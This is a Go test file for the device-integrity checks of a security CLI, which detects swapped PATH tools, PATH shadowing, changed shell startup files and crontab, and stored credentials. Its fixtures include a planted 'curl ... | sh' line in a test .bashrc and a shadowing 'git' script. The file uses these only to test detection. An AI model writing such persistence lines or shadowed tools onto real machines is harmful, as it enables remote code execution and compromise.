package cli

import (
	"context"
	"os"
	"path/filepath"
	"regexp"
	"runtime"
	"strings"
	"testing"

	"github.com/iimmuunnee/ai-defense-kit/internal/finding"
)

func devSkipWindows(t *testing.T) {
	t.Helper()
	if runtime.GOOS == "windows" {
		t.Skip("tools and persistence points are not compared on Windows")
	}
}

// devScript writes a harmless executable shell script.
func devScript(t *testing.T, path, word string) {
	t.Helper()
	if err := os.MkdirAll(filepath.Dir(path), 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(path, []byte("#!/bin/sh\necho "+word+"\n"), 0o755); err != nil {
		t.Fatal(err)
	}
}

// TestDrillD4: a script named pyenv on PATH is swapped for another one.
func TestDrillD4(t *testing.T) {
	devSkipWindows(t)
	home, bin := t.TempDir(), t.TempDir()
	devScript(t, filepath.Join(bin, "pyenv"), "ok")
	code, out, errs := runCLI(t, "device", "init", "--home", home, "--path", bin)
	if code != 0 {
		t.Fatalf("init: code=%d\n%s\n%s", code, out, errs)
	}
	baseline := filepath.Join(home, ".adk", "device-baseline.json")
	if _, err := os.Stat(baseline); err != nil {
		t.Fatalf("baseline not written: %v", err)
	}
	if !strings.Contains(errs, "SHA-256") {
		t.Errorf("init does not print the SHA-256:\n%s", errs)
	}
	if code, out, errs := runCLI(t, "device", "check", "--home", home, "--path", bin); code != 0 {
		t.Fatalf("check unchanged: code=%d\n%s\n%s", code, out, errs)
	}

	devScript(t, filepath.Join(bin, "pyenv"), "swapped")
	code, out, errs = runCLI(t, "device", "check", "--home", home, "--path", bin, "--format", "json")
	if code != 1 {
		t.Fatalf("check swapped: code=%d\n%s\n%s", code, out, errs)
	}
	r := devFindings(t, out)
	var hit bool
	for _, f := range r.Findings {
		if f.ID == "DV-101" && f.Severity >= finding.High && f.Location == "tool:pyenv" {
			hit = true
		}
	}
	if !hit {
		t.Fatalf("no DV-101 high for pyenv: %+v", r.Findings)
	}

	if code, _, errs := runCLI(t, "device", "accept", "tool:pyenv", "--home", home, "--path", bin); code != 2 || !strings.Contains(errs, "--note") {
		t.Errorf("accept without --note: code=%d\n%s", code, errs)
	}
	code, out, errs = runCLI(t, "device", "accept", "tool:pyenv", "--note", "직접 바꾼 시험", "--home", home, "--path", bin)
	if code != 0 {
		t.Fatalf("accept: code=%d\n%s\n%s", code, out, errs)
	}
	hist, err := os.ReadFile(filepath.Join(home, ".adk", "adk-device-history.jsonl"))
	if err != nil || !strings.Contains(string(hist), "직접 바꾼 시험") || !strings.Contains(string(hist), "tool:pyenv") {
		t.Errorf("history: %v\n%s", err, hist)
	}
	if code, out, errs := runCLI(t, "device", "check", "--home", home, "--path", bin); code != 0 {
		t.Fatalf("check after accept: code=%d\n%s\n%s", code, out, errs)
	}
}

func TestDeviceInitKeepsBaseline(t *testing.T) {
	devSkipWindows(t)
	home, bin := t.TempDir(), t.TempDir()
	devScript(t, filepath.Join(bin, "git"), "ok")
	if code, out, errs := runCLI(t, "device", "init", "--home", home, "--path", bin); code != 0 {
		t.Fatalf("init: code=%d\n%s\n%s", code, out, errs)
	}
	baseline := filepath.Join(home, ".adk", "device-baseline.json")
	before, _ := os.ReadFile(baseline)
	devScript(t, filepath.Join(bin, "git"), "other")
	code, _, errs := runCLI(t, "device", "init", "--home", home, "--path", bin)
	if code != 2 || !strings.Contains(errs, "덮어쓰지 않습니다") {
		t.Errorf("second init: code=%d\n%s", code, errs)
	}
	after, _ := os.ReadFile(baseline)
	if string(before) != string(after) {
		t.Errorf("second init changed the baseline")
	}
}

func TestDeviceCheckNeedsBaseline(t *testing.T) {
	devSkipWindows(t)
	code, _, errs := runCLI(t, "device", "check", "--home", t.TempDir(), "--path", t.TempDir())
	if code != 2 || !strings.Contains(errs, "adk device init") {
		t.Errorf("code=%d\n%s", code, errs)
	}
}

func TestDeviceBaselinePin(t *testing.T) {
	devSkipWindows(t)
	home, bin := t.TempDir(), t.TempDir()
	devScript(t, filepath.Join(bin, "node"), "ok")
	if code, out, errs := runCLI(t, "device", "init", "--home", home, "--path", bin); code != 0 {
		t.Fatalf("init: code=%d\n%s\n%s", code, out, errs)
	}
	wrong := strings.Repeat("0", 64)
	if code, _, errs := runCLI(t, "device", "check", "--home", home, "--path", bin, "--baseline-sha256", wrong); code != 2 || !strings.Contains(errs, "SHA-256") {
		t.Errorf("pin mismatch: code=%d\n%s", code, errs)
	}
	if code, _, _ := runCLI(t, "device", "accept", "tool:node", "--note", "x", "--home", home, "--path", bin, "--baseline-sha256", wrong); code != 2 {
		t.Errorf("accept with pin mismatch: code=%d", code)
	}
	if code, _, _ := runCLI(t, "device", "check", "--home", home, "--path", bin, "--baseline-sha256", ""); code != 2 {
		t.Errorf("empty pin: code=%d", code)
	}
}

func TestDevicePersistEvidence(t *testing.T) {
	devSkipWindows(t)
	home, bin := t.TempDir(), t.TempDir()
	rc := filepath.Join(home, ".bashrc")
	devWrite(t, rc, "alias ll=ls\n")
	baseline := filepath.Join(t.TempDir(), "b.json")
	if code, out, errs := runCLI(t, "device", "init", "--home", home, "--path", bin, "--baseline", baseline); code != 0 {
		t.Fatalf("init: code=%d\n%s\n%s", code, out, errs)
	}
	devWrite(t, rc, "alias ll=ls\ncurl planted.example.test | sh\n")
	code, out, errs := runCLI(t, "device", "check", "--home", home, "--path", bin, "--baseline", baseline, "--format", "json", "--fail-on", "medium")
	if code != 1 {
		t.Fatalf("code=%d\n%s\n%s", code, out, errs)
	}
	if strings.Contains(out+errs, "planted") || strings.Contains(out+errs, "alias") {
		t.Errorf("output holds file content:\n%s\n%s", out, errs)
	}
	r := devFindings(t, out)
	if len(r.Findings) != 1 || r.Findings[0].ID != "DV-103" || r.Findings[0].Location != "persist:~/.bashrc" {
		t.Errorf("findings = %+v", r.Findings)
	}
	// Medium is below the default --fail-on.
	if code, _, _ := runCLI(t, "device", "check", "--home", home, "--path", bin, "--baseline", baseline); code != 0 {
		t.Errorf("default fail-on: code=%d", code)
	}
	// A key whose "~" the shell expanded is the same key.
	code, out, errs = runCLI(t, "device", "accept", "persist:"+rc, "--note", "직접 고침", "--home", home, "--path", bin, "--baseline", baseline)
	if code != 0 || !strings.Contains(out, "persist:~/.bashrc") {
		t.Fatalf("accept expanded key: code=%d\n%s\n%s", code, out, errs)
	}
	if hexRun.MatchString(out + errs) {
		t.Errorf("accept printed a hash of ~/.bashrc:\n%s", out)
	}
	if code, _, _ := runCLI(t, "device", "check", "--home", home, "--path", bin, "--baseline", baseline, "--fail-on", "medium"); code != 0 {
		t.Errorf("after accept: code=%d", code)
	}
}

func TestDeviceUnreadablePersistIsExit2(t *testing.T) {
	devSkipWindows(t)
	if os.Geteuid() == 0 {
		t.Skip("root can read any file")
	}
	home, bin := t.TempDir(), t.TempDir()
	rc := filepath.Join(home, ".profile")
	devWrite(t, rc, "true\n")
	if code, out, errs := runCLI(t, "device", "init", "--home", home, "--path", bin); code != 0 {
		t.Fatalf("init: code=%d\n%s\n%s", code, out, errs)
	}
	if err := os.Chmod(rc, 0); err != nil {
		t.Fatal(err)
	}
	t.Cleanup(func() { _ = os.Chmod(rc, 0o600) })
	code, out, errs := runCLI(t, "device", "check", "--home", home, "--path", bin)
	if code != 2 || !strings.Contains(out, "확인 못 함") {
		t.Errorf("code=%d\n%s\n%s", code, out, errs)
	}
	// init records what it could not read as such, saves the baseline and
	// says the run is not verified.
	other := filepath.Join(t.TempDir(), "b.json")
	code, out, errs = runCLI(t, "device", "init", "--home", home, "--path", bin, "--baseline", other)
	if code != 2 || !strings.Contains(out+errs, "~/.profile") || !strings.Contains(out, "확인 못 함") {
		t.Errorf("init with unreadable: code=%d\n%s\n%s", code, out, errs)
	}
	if _, err := os.Stat(other); err != nil {
		t.Errorf("init with unreadable did not save the baseline: %v", err)
	}
	// Still unreadable: not verified. Readable again: a change.
	if code, _, _ := runCLI(t, "device", "check", "--home", home, "--path", bin, "--baseline", other); code != 2 {
		t.Errorf("check still unreadable: code=%d", code)
	}
	if err := os.Chmod(rc, 0o600); err != nil {
		t.Fatal(err)
	}
	code, out, errs = runCLI(t, "device", "check", "--home", home, "--path", bin, "--baseline", other, "--fail-on", "medium")
	if code != 1 || !strings.Contains(out, "persist:~/.profile") {
		t.Errorf("check readable again: code=%d\n%s\n%s", code, out, errs)
	}
}

// init never stops at what it cannot read: the token findings are reported,
// the baseline is saved, and a finding at --fail-on makes it 1.
func TestDeviceInitReportsTokensBesideUnreadable(t *testing.T) {
	devSkipWindows(t)
	if os.Geteuid() == 0 {
		t.Skip("root can read any file")
	}
	home, bin, dir := t.TempDir(), t.TempDir(), t.TempDir()
	long := devLongKey()
	devWrite(t, filepath.Join(home, ".aws", "credentials"), "[default]\naws_access_key_id = "+long+"\n")
	rc := filepath.Join(home, ".bashrc")
	devWrite(t, rc, "true\n")
	if err := os.Chmod(rc, 0); err != nil {
		t.Fatal(err)
	}
	t.Cleanup(func() { _ = os.Chmod(rc, 0o600) })
	// A masked systemd user unit is a link to /dev/null: recorded, not unread.
	unit := filepath.Join(home, ".config", "systemd", "user", "pulseaudio.socket")
	if err := os.MkdirAll(filepath.Dir(unit), 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.Symlink("/dev/null", unit); err != nil {
		t.Fatal(err)
	}
	code, out, errs := runCLI(t, "device", "init", "--home", home, "--path", bin, "--format", "json", "--out", dir)
	if code != 1 {
		t.Fatalf("init: code=%d\n%s\n%s", code, out, errs)
	}
	devNoValue(t, "init output", out+errs, []string{long})
	b, err := os.ReadFile(filepath.Join(dir, "adk-report.json"))
	if err != nil {
		t.Fatal(err)
	}
	r := devFindings(t, string(b))
	var key bool
	for _, f := range r.Findings {
		key = key || f.ID == "DV-003"
	}
	if !key {
		t.Errorf("init report lacks DV-003: %+v", r.Findings)
	}
	var bashrc, masked bool
	for _, c := range r.Checks {
		bashrc = bashrc || strings.Contains(c.Error, "~/.bashrc")
		masked = masked || strings.Contains(c.Error, "pulseaudio")
	}
	if !bashrc || masked {
		t.Errorf("checks = %+v", r.Checks)
	}
	if _, err := os.Stat(filepath.Join(home, ".adk", "device-baseline.json")); err != nil {
		t.Errorf("baseline not saved: %v", err)
	}
}

func TestDeviceLinkOutsideNotAccepted(t *testing.T) {
	devSkipWindows(t)
	home, prefix, elsewhere := t.TempDir(), t.TempDir(), t.TempDir()
	if err := os.MkdirAll(filepath.Join(prefix, "Cellar"), 0o755); err != nil {
		t.Fatal(err)
	}
	old := deviceHomeEnv
	t.Cleanup(func() { deviceHomeEnv = old })
	deviceHomeEnv = func(k string) string {
		if k == "HOMEBREW_PREFIX" {
			return prefix
		}
		return ""
	}
	bin := filepath.Join(prefix, "bin")
	devScript(t, filepath.Join(elsewhere, "gh"), "ok")
	if err := os.MkdirAll(bin, 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.Symlink(filepath.Join(elsewhere, "gh"), filepath.Join(bin, "gh")); err != nil {
		t.Fatal(err)
	}
	// At init: a medium review item, recorded in the baseline; exit 0 at --fail-on high.
	code, out, errs := runCLI(t, "device", "init", "--home", home, "--path", bin, "--format", "json")
	if code != 0 {
		t.Fatalf("init: code=%d\n%s\n%s", code, out, errs)
	}
	r := devFindings(t, out)
	if len(r.Findings) != 1 || r.Findings[0].ID != "DV-102" || r.Findings[0].Severity != finding.Medium {
		t.Fatalf("init findings = %+v", r.Findings)
	}
	if _, err := os.Stat(filepath.Join(home, ".adk", "device-baseline.json")); err != nil {
		t.Errorf("init with DV-102 did not save the baseline: %v", err)
	}
	// Unchanged and baselined: silent.
	if code, out, errs := runCLI(t, "device", "check", "--home", home, "--path", bin, "--fail-on", "low"); code != 0 || strings.Contains(out, "DV-102") {
		t.Errorf("check unchanged: code=%d\n%s\n%s", code, out, errs)
	}
	// Retargeted to another outside file: DV-102 high, exit 1.
	devScript(t, filepath.Join(elsewhere, "gh2"), "other")
	if err := os.Remove(filepath.Join(bin, "gh")); err != nil {
		t.Fatal(err)
	}
	if err := os.Symlink(filepath.Join(elsewhere, "gh2"), filepath.Join(bin, "gh")); err != nil {
		t.Fatal(err)
	}
	code, out, errs = runCLI(t, "device", "check", "--home", home, "--path", bin)
	if code != 1 || !strings.Contains(out, "DV-102") || !strings.Contains(out, "adk device accept tool:gh") {
		t.Fatalf("check retargeted: code=%d\n%s\n%s", code, out, errs)
	}
	_, out, _ = runCLI(t, "device", "check", "--home", home, "--path", bin, "--format", "json")
	if r := devFindings(t, out); len(r.Findings) != 1 || r.Findings[0].ID != "DV-102" || r.Findings[0].Severity != finding.High {
		t.Fatalf("retargeted findings = %+v", r.Findings)
	}
	// accept records it like any other change.
	if code, out, errs := runCLI(t, "device", "accept", "tool:gh", "--note", "확인함", "--home", home, "--path", bin); code != 0 || strings.Contains(errs, "DV-102") {
		t.Fatalf("accept: code=%d\n%s\n%s", code, out, errs)
	}
	if code, out, _ := runCLI(t, "device", "check", "--home", home, "--path", bin); code != 0 {
		t.Errorf("check after accept: code=%d\n%s", code, out)
	}
}

// The user crontab key has a space: the hint quotes it, and accept takes it.
func TestDeviceCrontabKey(t *testing.T) {
	devSkipWindows(t)
	old := deviceHomeCrontab
	t.Cleanup(func() { deviceHomeCrontab = old })
	body := "first"
	deviceHomeCrontab = func(context.Context) ([]byte, bool, error) { return []byte(body), true, nil }
	home, bin := t.TempDir(), t.TempDir()
	if code, out, errs := runCLI(t, "device", "init", "--home", home, "--path", bin); code != 0 {
		t.Fatalf("init: code=%d\n%s\n%s", code, out, errs)
	}
	body = "second"
	code, out, errs := runCLI(t, "device", "check", "--home", home, "--path", bin)
	if code != 1 || !strings.Contains(out, `adk device accept 'persist:crontab -l' --note`) {
		t.Fatalf("check: code=%d\n%s\n%s", code, out, errs)
	}
	code, out, errs = runCLI(t, "device", "accept", "persist:crontab -l", "--note", "직접 고침", "--home", home, "--path", bin)
	if code != 0 {
		t.Fatalf("accept: code=%d\n%s\n%s", code, out, errs)
	}
	// Persistence hashes are never printed: such a file may hold tokens.
	if hexRun.MatchString(out + errs) {
		t.Errorf("accept printed a hash of a persistence file:\n%s\n%s", out, errs)
	}
	if code, _, _ := runCLI(t, "device", "check", "--home", home, "--path", bin); code != 0 {
		t.Errorf("check after accept: code=%d", code)
	}
}

// hexRun is a SHA-256 written out, apart from the baseline's own (which is
// printed on purpose and is checked for separately by the caller).
var hexRun = regexp.MustCompile(`sha256: [0-9a-f]{64}|-> [0-9a-f]{64}`)

func TestDeviceAcceptArgs(t *testing.T) {
	devSkipWindows(t)
	home, bin := t.TempDir(), t.TempDir()
	devScript(t, filepath.Join(bin, "git"), "ok")
	if code, out, errs := runCLI(t, "device", "init", "--home", home, "--path", bin); code != 0 {
		t.Fatalf("init: code=%d\n%s\n%s", code, out, errs)
	}
	if code, _, _ := runCLI(t, "device", "accept", "--note", "x", "--home", home, "--path", bin); code != 2 {
		t.Errorf("no key: code=%d", code)
	}
	if code, _, errs := runCLI(t, "device", "accept", "tool:nosuch", "--note", "x", "--home", home, "--path", bin); code != 2 || !strings.Contains(errs, "tool:nosuch") {
		t.Errorf("unknown key: code=%d\n%s", code, errs)
	}
	if code, out, _ := runCLI(t, "device", "accept", "tool:git", "--note", "x", "--home", home, "--path", bin); code != 0 || !strings.Contains(out, "바꾼 것이 없습니다") {
		t.Errorf("unchanged key: code=%d\n%s", code, out)
	}
	if code, _, _ := runCLI(t, "device", "--note", "x", "--home", home); code != 2 {
		t.Errorf("--note on bare device: code=%d", code)
	}
}

// On Windows, init and check run the token check only and say so.
func TestDeviceWindowsTokensOnly(t *testing.T) {
	old := deviceGOOS
	t.Cleanup(func() { deviceGOOS = old })
	deviceGOOS = "windows"
	home := t.TempDir()
	for _, sub := range []string{"init", "check"} {
		code, out, errs := runCLI(t, "device", sub, "--home", home, "--path", t.TempDir())
		if code != 0 || !strings.Contains(out+errs, "Windows에서는") {
			t.Errorf("%s: code=%d\n%s\n%s", sub, code, out, errs)
		}
	}
	if _, err := os.Stat(filepath.Join(home, ".adk", "device-baseline.json")); err == nil {
		t.Errorf("baseline written on Windows")
	}
	if code, _, errs := runCLI(t, "device", "accept", "tool:git", "--note", "x", "--home", home); code != 2 || !strings.Contains(errs, "Windows에서는") {
		t.Errorf("accept: code=%d\n%s", code, errs)
	}
}

// A credential stored when the baseline was made is still reported by check
// but no longer fails it; one stored after it does, until accepted.
func TestDeviceStoredTokenBaselined(t *testing.T) {
	devSkipWindows(t)
	home, bin := t.TempDir(), t.TempDir()
	long, gh := devLongKey(), devFake("ghtokn")
	devWrite(t, filepath.Join(home, ".aws", "credentials"), "[default]\naws_access_key_id = "+long+"\n")
	// init has no earlier baseline: the key counts, and it is recorded.
	code, out, errs := runCLI(t, "device", "init", "--home", home, "--path", bin)
	if code != 1 || !strings.Contains(out, "DV-003") {
		t.Fatalf("init: code=%d\n%s\n%s", code, out, errs)
	}
	baseline := filepath.Join(home, ".adk", "device-baseline.json")
	b, err := os.ReadFile(baseline)
	if err != nil || !strings.Contains(string(b), "token:DV-003 ~/.aws/credentials [default] aws_access_key_id") {
		t.Fatalf("baseline: %v\n%s", err, b)
	}
	devNoValue(t, "baseline", string(b), []string{long, gh})

	code, out, errs = runCLI(t, "device", "check", "--home", home, "--path", bin, "--format", "json")
	if code != 0 {
		t.Fatalf("check with the baselined key: code=%d\n%s\n%s", code, out, errs)
	}
	r := devFindings(t, out)
	if len(r.Findings) != 1 || r.Findings[0].ID != "DV-003" || r.Findings[0].Severity != finding.High || !strings.Contains(r.Findings[0].Title, "기준값에 있던 항목") {
		t.Fatalf("check findings = %+v", r.Findings)
	}
	// Bare device is unchanged: every stored credential counts.
	if code, _, _ := runCLI(t, "device", "--home", home); code != 1 {
		t.Errorf("bare device: code=%d", code)
	}

	devWrite(t, filepath.Join(home, ".config", "gh", "hosts.yml"), "github.com:\n    oauth_token: "+gh+"\n")
	code, out, errs = runCLI(t, "device", "check", "--home", home, "--path", bin)
	ghKey := `token:DV-004 ~/.config/gh/hosts.yml hosts["github.com"].oauth_token`
	if code != 1 || !strings.Contains(out, "DV-004") || !strings.Contains(errs, shellQuote(ghKey)) {
		t.Fatalf("check with a new gh token: code=%d\n%s\n%s", code, out, errs)
	}
	devNoValue(t, "check", out+errs, []string{long, gh})
	code, out, errs = runCLI(t, "device", "accept", ghKey, "--note", "임시로 둠", "--home", home, "--path", bin)
	if code != 0 {
		t.Fatalf("accept token key: code=%d\n%s\n%s", code, out, errs)
	}
	devNoValue(t, "accept", out+errs, []string{long, gh})
	if code, out, errs := runCLI(t, "device", "check", "--home", home, "--path", bin); code != 0 {
		t.Errorf("check after accept: code=%d\n%s\n%s", code, out, errs)
	}
	b, _ = os.ReadFile(baseline)
	devNoValue(t, "baseline after accept", string(b), []string{long, gh})
}

// check looks for the tools in the PATH init recorded, so a scheduled run
// with a short PATH does not see every tool as gone.
func TestDeviceCheckUsesBaselinePath(t *testing.T) {
	devSkipWindows(t)
	home, bin, short := t.TempDir(), t.TempDir(), t.TempDir()
	devScript(t, filepath.Join(bin, "git"), "ok")
	old := deviceHomeEnv
	t.Cleanup(func() { deviceHomeEnv = old })
	shellPath := bin
	deviceHomeEnv = func(k string) string {
		if k == "PATH" {
			return shellPath
		}
		return ""
	}
	if code, out, errs := runCLI(t, "device", "init", "--home", home); code != 0 {
		t.Fatalf("init: code=%d\n%s\n%s", code, out, errs)
	}
	// A cron-like PATH at check time.
	shellPath = short
	code, out, errs := runCLI(t, "device", "check", "--home", home)
	if code != 0 || !strings.Contains(out+errs, "기준값에 기록한 PATH") || !strings.Contains(out+errs, "지금 셸의 PATH와 다릅니다") {
		t.Fatalf("check with another shell PATH: code=%d\n%s\n%s", code, out, errs)
	}
	// --path overrides it.
	code, out, errs = runCLI(t, "device", "check", "--home", home, "--path", short)
	if code != 1 || !strings.Contains(out, "tool:git") {
		t.Fatalf("check --path: code=%d\n%s\n%s", code, out, errs)
	}
	// accept env:PATH takes the PATH given now, and the tools with it.
	code, out, errs = runCLI(t, "device", "accept", "env:PATH", "tool:git", "--path", short, "--note", "PATH 바꿈", "--home", home)
	if code != 0 {
		t.Fatalf("accept PATH: code=%d\n%s\n%s", code, out, errs)
	}
	if code, out, errs := runCLI(t, "device", "check", "--home", home); code != 0 || strings.Contains(out+errs, "지금 셸의 PATH와 다릅니다") {
		t.Errorf("check after accepting PATH: code=%d\n%s\n%s", code, out, errs)
	}
	// The shell's PATH now finds a git the baseline does not have: it runs
	// first there, so it is reported.
	shellPath = bin
	if code, out, errs := runCLI(t, "device", "check", "--home", home); code != 1 || !strings.Contains(out, "tool:git") {
		t.Errorf("shell PATH finds a new git: code=%d\n%s\n%s", code, out, errs)
	}
}

// A same-name tool put in a new folder at the front of the shell's PATH is
// reported though the tools are looked up in the baseline's PATH.
func TestDeviceShellPathShadow(t *testing.T) {
	devSkipWindows(t)
	home, bin, evil := t.TempDir(), t.TempDir(), t.TempDir()
	devScript(t, filepath.Join(bin, "git"), "ok")
	old := deviceHomeEnv
	t.Cleanup(func() { deviceHomeEnv = old })
	shellPath := bin
	deviceHomeEnv = func(k string) string {
		if k == "PATH" {
			return shellPath
		}
		return ""
	}
	if code, out, errs := runCLI(t, "device", "init", "--home", home); code != 0 {
		t.Fatalf("init: code=%d\n%s\n%s", code, out, errs)
	}
	devScript(t, filepath.Join(evil, "git"), "payload")
	shellPath = evil + string(os.PathListSeparator) + bin
	code, out, errs := runCLI(t, "device", "check", "--home", home, "--format", "json")
	if code != 1 {
		t.Fatalf("check: code=%d\n%s\n%s", code, out, errs)
	}
	r := devFindings(t, out)
	if len(r.Findings) != 1 || r.Findings[0].ID != "DV-101" || r.Findings[0].Severity != finding.High || r.Findings[0].Location != "tool:git" ||
		!strings.Contains(r.Findings[0].Evidence, "지금 셸의 PATH") || !strings.Contains(r.Findings[0].Evidence, "기준값의 PATH") {
		t.Fatalf("findings = %+v", r.Findings)
	}
	if !strings.Contains(errs, "adk device accept env:PATH tool:git --path") {
		t.Errorf("no accept hint:\n%s", errs)
	}
	// --path stays authoritative: only that PATH is looked at.
	if code, _, _ := runCLI(t, "device", "check", "--home", home, "--path", bin); code != 0 {
		t.Errorf("check --path: code=%d", code)
	}
	// Accepted with that PATH: quiet again.
	if code, out, errs := runCLI(t, "device", "accept", "env:PATH", "tool:git", "--path", shellPath, "--note", "확인함", "--home", home); code != 0 {
		t.Fatalf("accept: code=%d\n%s\n%s", code, out, errs)
	}
	if code, out, errs := runCLI(t, "device", "check", "--home", home); code != 0 {
		t.Errorf("check after accept: code=%d\n%s\n%s", code, out, errs)
	}
}

// A baselined credential that is gone is named, with the accept that takes
// its removal in; until then, one stored again at the same place is not
// counted.
func TestDeviceVanishedTokenNoted(t *testing.T) {
	devSkipWindows(t)
	home, bin := t.TempDir(), t.TempDir()
	creds := filepath.Join(home, ".aws", "credentials")
	devWrite(t, creds, "[default]\naws_access_key_id = "+devLongKey()+"\n")
	if code, out, errs := runCLI(t, "device", "init", "--home", home, "--path", bin); code != 1 {
		t.Fatalf("init: code=%d\n%s\n%s", code, out, errs)
	}
	key := "token:DV-003 ~/.aws/credentials [default] aws_access_key_id"
	devWrite(t, creds, "[default]\nregion = ap-northeast-2\n")
	code, out, errs := runCLI(t, "device", "check", "--home", home, "--path", bin)
	if code != 0 || !strings.Contains(errs, "기준값에 있던 토큰") || !strings.Contains(errs, shellQuote(key)) {
		t.Fatalf("check after removal: code=%d\n%s\n%s", code, out, errs)
	}
	if code, out, errs := runCLI(t, "device", "accept", key, "--note", "키 지움", "--home", home, "--path", bin); code != 0 {
		t.Fatalf("accept removal: code=%d\n%s\n%s", code, out, errs)
	}
	if code, _, errs := runCLI(t, "device", "check", "--home", home, "--path", bin); code != 0 || strings.Contains(errs, "기준값에 있던 토큰") {
		t.Errorf("check after accepting removal: code=%d\n%s", code, errs)
	}
	// Stored again after the removal was accepted: new, so it counts.
	devWrite(t, creds, "[default]\naws_access_key_id = "+devLongKey()+"\n")
	if code, _, _ := runCLI(t, "device", "check", "--home", home, "--path", bin); code != 1 {
		t.Errorf("stored again: code=%d", code)
	}
}
